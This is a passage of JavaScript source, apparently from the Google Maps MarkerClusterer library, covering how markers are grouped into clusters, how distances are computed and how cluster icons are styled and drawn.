      bounds.extend(ne);
      bounds.extend(sw);
      return bounds;
    };
    MarkerClusterer.prototype.isMarkerInBounds_ = function (marker, bounds) {
      return bounds.contains(marker.getPosition());
    };
    MarkerClusterer.prototype.clearMarkers = function () {
      this.resetViewport(true);
      this.markers_ = [];
    };
    MarkerClusterer.prototype.resetViewport = function (opt_hide) {
      for (var i = 0, cluster; cluster = this.clusters_[i]; i++) {
        cluster.remove();
      }
      for (var i = 0, marker; marker = this.markers_[i]; i++) {
        marker.isAdded = false;
        if (opt_hide) {
          marker.setMap(null);
        }
      }
      this.clusters_ = [];
    };
    MarkerClusterer.prototype.repaint = function () {
      var oldClusters = this.clusters_.slice();
      this.clusters_.length = 0;
      this.resetViewport();
      this.redraw();
      window.setTimeout(function () {
        for (var i = 0, cluster; cluster = oldClusters[i]; i++) {
          cluster.remove();
        }
      }, 0);
    };
    MarkerClusterer.prototype.redraw = function () {
      this.createClusters_();
    };
    MarkerClusterer.prototype.distanceBetweenPoints_ = function (p1, p2) {
      if (!p1 || !p2) {
        return 0;
      }
      var R = 6371;
      var dLat = (p2.lat() - p1.lat()) * Math.PI / 180;
      var dLon = (p2.lng() - p1.lng()) * Math.PI / 180;
      var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(p1.lat() * Math.PI / 180) * Math.cos(p2.lat() * Math.PI / 180) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
      var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
      var d = R * c;
      return d;
    };
    MarkerClusterer.prototype.addToClosestCluster_ = function (marker) {
      var distance = 40000;
      var clusterToAddTo = null;
      var pos = marker.getPosition();
      for (var i = 0, cluster; cluster = this.clusters_[i]; i++) {
        var center = cluster.getCenter();
        if (center) {
          var d = this.distanceBetweenPoints_(center, marker.getPosition());
          if (d < distance) {
            distance = d;
            clusterToAddTo = cluster;
          }
        }
      }
      if (clusterToAddTo && clusterToAddTo.isMarkerInClusterBounds(marker)) {
        clusterToAddTo.addMarker(marker);
      } else {
        var cluster = new Cluster(this);
        cluster.addMarker(marker);
        this.clusters_.push(cluster);
      }
    };
    MarkerClusterer.prototype.createClusters_ = function () {
      if (!this.ready_) {
        return;
      }
      var mapBounds = new google.maps.LatLngBounds(this.map_.getBounds().getSouthWest(), this.map_.getBounds().getNorthEast());
      var bounds = this.getExtendedBounds(mapBounds);
      for (var i = 0, marker; marker = this.markers_[i]; i++) {
        if (!marker.isAdded && this.isMarkerInBounds_(marker, bounds)) {
          this.addToClosestCluster_(marker);
        }
      }
    };
    function Cluster(markerClusterer) {
      this.markerClusterer_ = markerClusterer;
      this.map_ = markerClusterer.getMap();
      this.gridSize_ = markerClusterer.getGridSize();
      this.minClusterSize_ = markerClusterer.getMinClusterSize();
      this.averageCenter_ = markerClusterer.isAverageCenter();
      this.center_ = null;
      this.markers_ = [];
      this.bounds_ = null;
      this.clusterIcon_ = new ClusterIcon(this, markerClusterer.getStyles(), markerClusterer.getGridSize());
    }
    Cluster.prototype.isMarkerAlreadyAdded = function (marker) {
      if (this.markers_.indexOf) {
        return this.markers_.indexOf(marker) != -1;
      } else {
        for (var i = 0, m; m = this.markers_[i]; i++) {
          if (m == marker) {
            return true;
          }
        }
      }
      return false;
    };
    Cluster.prototype.addMarker = function (marker) {
      if (this.isMarkerAlreadyAdded(marker)) {
        return false;
      }
      if (!this.center_) {
        this.center_ = marker.getPosition();
        this.calculateBounds_();
      } else {
        if (this.averageCenter_) {
          var l = this.markers_.length + 1;
          var lat = (this.center_.lat() * (l - 1) + marker.getPosition().lat()) / l;
          var lng = (this.center_.lng() * (l - 1) + marker.getPosition().lng()) / l;
          this.center_ = new google.maps.LatLng(lat, lng);
          this.calculateBounds_();
        }
      }
      marker.isAdded = true;
      this.markers_.push(marker);
      var len = this.markers_.length;
      if (len < this.minClusterSize_ && marker.getMap() != this.map_) {
        marker.setMap(this.map_);
      }
      if (len == this.minClusterSize_) {
        for (var i = 0; i < len; i++) {
          this.markers_[i].setMap(null);
        }
      }
      if (len >= this.minClusterSize_) {
        marker.setMap(null);
      }
      this.updateIcon();
      return true;
    };
    Cluster.prototype.getMarkerClusterer = function () {
      return this.markerClusterer_;
    };
    Cluster.prototype.getBounds = function () {
      var bounds = new google.maps.LatLngBounds(this.center_, this.center_);
      var markers = this.getMarkers();
      for (var i = 0, marker; marker = markers[i]; i++) {
        bounds.extend(marker.getPosition());
      }
      return bounds;
    };
    Cluster.prototype.remove = function () {
      this.clusterIcon_.remove();
      this.markers_.length = 0;
      delete this.markers_;
    };
    Cluster.prototype.getSize = function () {
      return this.markers_.length;
    };
    Cluster.prototype.getMarkers = function () {
      return this.markers_;
    };
    Cluster.prototype.getCenter = function () {
      return this.center_;
    };
    Cluster.prototype.calculateBounds_ = function () {
      var bounds = new google.maps.LatLngBounds(this.center_, this.center_);
      this.bounds_ = this.markerClusterer_.getExtendedBounds(bounds);
    };
    Cluster.prototype.isMarkerInClusterBounds = function (marker) {
      return this.bounds_.contains(marker.getPosition());
    };
    Cluster.prototype.getMap = function () {
      return this.map_;
    };
    Cluster.prototype.updateIcon = function () {
      var zoom = this.map_.getZoom();
      var mz = this.markerClusterer_.getMaxZoom();
      if (mz && zoom > mz) {
        for (var i = 0, marker; marker = this.markers_[i]; i++) {
          marker.setMap(this.map_);
        }
        return;
      }
      if (this.markers_.length < this.minClusterSize_) {
        this.clusterIcon_.hide();
        return;
      }
      var numStyles = this.markerClusterer_.getStyles().length;
      var sums = this.markerClusterer_.getCalculator()(this.markers_, numStyles);
      this.clusterIcon_.setCenter(this.center_);
      this.clusterIcon_.setSums(sums);
      this.clusterIcon_.show();
    };
    function ClusterIcon(cluster, styles, opt_padding) {
      cluster.getMarkerClusterer().extend(ClusterIcon, google.maps.OverlayView);
      this.styles_ = styles;
      this.padding_ = opt_padding || 0;
      this.cluster_ = cluster;
      this.center_ = null;
      this.map_ = cluster.getMap();
      this.div_ = null;
      this.sums_ = null;
      this.visible_ = false;
      this.setMap(this.map_);
    }
    ClusterIcon.prototype.triggerClusterClick = function (event) {
      var markerClusterer = this.cluster_.getMarkerClusterer();
      google.maps.event.trigger(markerClusterer, 'clusterclick', this.cluster_, event);
      if (markerClusterer.isZoomOnClick()) {
        this.map_.fitBounds(this.cluster_.getBounds());
      }
    };
    ClusterIcon.prototype.onAdd = function () {
      this.div_ = document.createElement('DIV');
      if (this.visible_) {
        var pos = this.getPosFromLatLng_(this.center_);
        this.div_.style.cssText = this.createCss(pos);
        this.div_.innerHTML = this.sums_.text;
      }
      var panes = this.getPanes();
      panes.overlayMouseTarget.appendChild(this.div_);
      var that = this;
      google.maps.event.addDomListener(this.div_, 'click', function (event) {
        that.triggerClusterClick(event);
      });
    };
    ClusterIcon.prototype.getPosFromLatLng_ = function (latlng) {
      var pos = this.getProjection().fromLatLngToDivPixel(latlng);
      if (typeof this.iconAnchor_ === 'object' && this.iconAnchor_.length === 2) {
        pos.x -= this.iconAnchor_[0];
        pos.y -= this.iconAnchor_[1];
      } else {
        pos.x -= parseInt(this.width_ / 2, 10);
        pos.y -= parseInt(this.height_ / 2, 10);
      }
      return pos;
    };
    ClusterIcon.prototype.draw = function () {
      if (this.visible_) {
        var pos = this.getPosFromLatLng_(this.center_);
        this.div_.style.top = pos.y + 'px';
        this.div_.style.left = pos.x + 'px';
      }
    };
    ClusterIcon.prototype.hide = function () {
      if (this.div_) {
        this.div_.style.display = 'none';
      }
      this.visible_ = false;
    };
    ClusterIcon.prototype.show = function () {
      if (this.div_) {
        var pos = this.getPosFromLatLng_(this.center_);
        this.div_.style.cssText = this.createCss(pos);
        this.div_.style.display = '';
      }
      this.visible_ = true;
    };
    ClusterIcon.prototype.remove = function () {
      this.setMap(null);
    };
    ClusterIcon.prototype.onRemove = function () {
      if (this.div_ && this.div_.parentNode) {
        this.hide();
        this.div_.parentNode.removeChild(this.div_);
        this.div_ = null;
      }
    };
    ClusterIcon.prototype.setSums = function (sums) {
      this.sums_ = sums;
      this.text_ = sums.text;
      this.index_ = sums.index;
      if (this.div_) {
        this.div_.innerHTML = sums.text;
      }
      this.useStyle();
    };
    ClusterIcon.prototype.useStyle = function () {
      var index = Math.max(0, this.sums_.index - 1);
      index = Math.min(this.styles_.length - 1, index);
      var style = this.styles_[index];
      this.url_ = style['url'];
      this.height_ = style['height'];
      this.width_ = style['width'];
      this.textColor_ = style['textColor'];
      this.anchor_ = style['anchor'];
      this.textSize_ = style['textSize'];
      this.backgroundPosition_ = style['backgroundPosition'];
      this.iconAnchor_ = style['iconAnchor'];
    };
    ClusterIcon.prototype.setCenter = function (center) {
      this.center_ = center;
    };
    ClusterIcon.prototype.createCss = function (pos) {
      var style = [];
      style.push('background-image:url(' + this.url_ + ');');
      var backgroundPosition = this.backgroundPosition_ ? this.backgroundPosition_ : '0 0';
      style.push('background-position:' + backgroundPosition + ';');
      if (typeof this.anchor_ === 'object') {
        if (typeof this.anchor_[0] === 'number' && this.anchor_[0] > 0 && this.anchor_[0] < this.height_) {
          style.push('height:' + (this.height_ - this.anchor_[0]) + 'px; padding-top:' + this.anchor_[0] + 'px;');
        } else if (typeof this.anchor_[0] === 'number' && this.anchor_[0] < 0 && -this.anchor_[0] < this.height_) {
          style.push('height:' + this.height_ + 'px; line-height:' + (this.height_ + this.anchor_[0]) + 'px;');
        } else {
          style.push('height:' + this.height_ + 'px; line-height:' + this.height_ + 'px;');
        }
        if (typeof this.anchor_[1] === 'number' && this.anchor_[1] > 0 && this.anchor_[1] < this.width_) {
          style.push('width:' + (this.width_ - this.anchor_[1]) + 'px; padding-left:' + this.anchor_[1] + 'px;');
        } else {
          style.push('width:' + this.width_ + 'px; text-align:center;');
        }
      } else {
        style.push('height:' + this.height_ + 'px; line-height:' + this.height_ + 'px; width:' + this.width_ + 'px; text-align:center;');
      }
      var txtColor = this.textColor_ ? this.textColor_ : 'black';
      var txtSize = this.textSize_ ? this.textSize_ : 11;
      style.push('cursor:pointer; top:' + pos.y + 'px; left:' + pos.x + 'px; color:' + txtColor + '; position:absolute; font-size:' + txtSize + 'px; font-family:Arial,sans-serif; font-weight:bold');
      return style.join('');
    };
    window['MarkerClusterer'] = MarkerClusterer;
    MarkerClusterer.prototype['addMarker'] = MarkerClusterer.prototype.addMarker;
    MarkerClusterer.prototype['addMarkers'] = MarkerClusterer.prototype.addMarkers;
    MarkerClusterer.prototype['clearMarkers'] = MarkerClusterer.prototype.clearMarkers;
    MarkerClusterer.prototype['fitMapToMarkers'] = MarkerClusterer.prototype.fitMapToMarkers;
    MarkerClusterer.prototype['getCalculator'] = MarkerClusterer.prototype.getCalculator;
    MarkerClusterer.prototype['getGridSize'] = MarkerClusterer.prototype.getGridSize;
    MarkerClusterer.prototype['getExtendedBounds'] = MarkerClusterer.prototype.getExtendedBounds;
    MarkerClusterer.prototype['getMap'] = MarkerClusterer.prototype.getMap;
    MarkerClusterer.prototype['getMarkers'] = MarkerClusterer.prototype.getMarkers;
    MarkerClusterer.prototype['getMaxZoom'] = MarkerClusterer.prototype.getMaxZoom;
    MarkerClusterer.prototype['getStyles'] = MarkerClusterer.prototype.getStyles;
    MarkerClusterer.prototype['getTotalClusters'] = MarkerClusterer.prototype.getTotalClusters;
    MarkerClusterer.prototype['getTotalMarkers'] = MarkerClusterer.prototype.getTotalMarkers;
    MarkerClusterer.prototype['redraw'] = MarkerClusterer.prototype.redraw;
    MarkerClusterer.prototype['removeMarker'] = MarkerClusterer.prototype.removeMarker;
    MarkerClusterer.prototype['removeMarkers'] = MarkerClusterer.prototype.removeMarkers;
    MarkerClusterer.prototype['resetViewport'] = MarkerClusterer.prototype.resetViewport;
    MarkerClusterer.prototype['repaint'] = MarkerClusterer.prototype.repaint;
    MarkerClusterer.prototype['setCalculator'] = MarkerClusterer.prototype.setCalculator;
    MarkerClusterer.prototype['setGridSize'] = MarkerClusterer.prototype.setGridSize;
    MarkerClusterer.prototype['setMaxZoom'] = MarkerClusterer.prototype.setMaxZoom;
    MarkerClusterer.prototype['onAdd'] = MarkerClusterer.prototype.onAdd;
    MarkerClusterer.prototype['draw'] = MarkerClusterer.prototype.draw;
    Cluster.prototype['getCenter'] = Cluster.prototype.getCenter;
    Cluster.prototype['getSize'] = Cluster.prototype.getSize;
    Cluster.prototype['getMarkers'] = Cluster.prototype.getMarkers;
    ClusterIcon.prototype['onAdd'] = ClusterIcon.prototype.onAdd;
    ClusterIcon.prototype['draw'] = ClusterIcon.prototype.draw;
    ClusterIcon.prototype['onRemove'] = ClusterIcon.prototype.onRemove;
  }
}
;